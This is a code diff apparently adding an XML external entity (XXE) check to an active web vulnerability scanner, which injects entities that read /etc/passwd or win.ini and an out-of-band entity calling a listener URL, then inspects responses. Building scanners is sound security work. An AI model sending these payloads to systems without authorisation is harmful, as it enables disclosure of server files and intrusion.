@@ -282,6 +282,76 @@ class CommandInjection:
         return None
 
 
+def _inject_first_text(xml: str, value: str):
+    """Replace the first non-empty text node in an XML document with `value`. Returns (new_xml, replaced?)."""
+    done = {"v": False}
+
+    def repl(m):
+        done["v"] = True
+        return ">" + value + "<"
+    # a '>' followed by text containing at least one non-space char, then '<'
+    out = re.sub(r">(?=[^<>&]*[^\s<>&])[^<>&]*<", repl, xml, count=1)
+    return out, done["v"]
+
+
+def _xml_with_entity(body: str, entity_def: str, ref: str) -> str | None:
+    """Add a DOCTYPE defining an external entity and reference it in the first text node. None if there's no
+    text node to carry the reference (an unreferenced entity wouldn't prove anything)."""
+    doctype = f"<!DOCTYPE wyrm [ {entity_def} ]>"
+    m = re.match(r"\s*<\?xml[^>]*\?>", body)
+    base = (body[:m.end()] + doctype + body[m.end():]) if m else (doctype + body)
+    out, ok = _inject_first_text(base, ref)
+    return out if ok else None
+
+
+class Xxe:
+    """XML external entity injection (request-level): when the request sends XML, define an external entity that
+    reads a local file (or calls an out-of-band URL) and reference it in the document. If the file content comes
+    back — or the OOB listener is hit — the XML parser resolves external entities (XXE)."""
+
+    key, title, severity = "xxe", "XML external entity (XXE)", "high"
+
+    def _is_xml(self, headers, body) -> bool:
+        if not body or not isinstance(body, str):
+            return False
+        ct = " ".join(str(v) for k, v in headers.items() if k.lower() == "content-type").lower()
+        if "xml" in ct:
+            return True
+        b = body.lstrip()
+        return b.startswith("<?xml") or bool(re.match(r"<[a-zA-Z][\w:.-]*[\s>]", b) and "</" in b)
+
+    def run_request(self, method, url, headers, body, send, baseline, rand, oob=None):
+        if not self._is_xml(headers, body):
+            return None
+        hdrs = dict(headers)
+        hdrs.setdefault("Content-Type", "application/xml")
+
+        def finding(payload_body, evidence, resp):
+            return {"check": self.key, "title": self.title, "severity": self.severity, "confidence": "firm",
+                    "loc": "body-xml", "param": "XML entity", "payload": payload_body[:300],
+                    "evidence": evidence, "status": (resp or {}).get("status"), "url": url}
+
+        # 1) out-of-band: entity fetches our listener (works even when the file isn't reflected back)
+        if oob is not None:
+            token = oob.token()
+            ourl = oob.url(token)
+            if ourl:
+                p = _xml_with_entity(body, f'<!ENTITY xxe SYSTEM "{ourl}">', "&xxe;")
+                r = send(url, hdrs, p) if p else None
+                if p and oob.wait_hit(token, 10):
+                    return finding(p, "The XML parser fetched our out-of-band URL via an external entity — XXE.", r)
+        # 2) classic in-band file read: /etc/passwd then win.ini
+        for ent in ('<!ENTITY xxe SYSTEM "file:///etc/passwd">', '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">'):
+            p = _xml_with_entity(body, ent, "&xxe;")
+            if not p:
+                return None
+            r = send(url, hdrs, p)
+            if r and (_PASSWD.search(r.get("text", "")) or _WININI.search(r.get("text", ""))):
+                return finding(p, "A local system file (/etc/passwd or win.ini) was returned via an external "
+                                  "entity — XXE with file disclosure.", r)
+        return None
+
+
 class CorsMisconfig:
     """CORS misconfiguration (request-level): send an attacker Origin and see whether the app trusts it. Reflecting
     an arbitrary Origin in Access-Control-Allow-Origin lets any site make cross-origin reads; doing so with
@@ -323,7 +393,7 @@ class CorsMisconfig:
 def standard(time_based: bool = True) -> list:
     """The full active check set. time_based=False drops the slow sleep-based probes (blind SQLi, command inj.)."""
     return [ReflectedXSS(), SqlError(), SqlBlindBoolean(), SqlBlindTime(time_based=time_based), Ssti(),
-            PathTraversal(), OpenRedirect(), CrlfInjection(), CorsMisconfig(), Ssrf(),
+            PathTraversal(), OpenRedirect(), CrlfInjection(), CorsMisconfig(), Xxe(), Ssrf(),
             CommandInjection(time_based=time_based)]
 
 
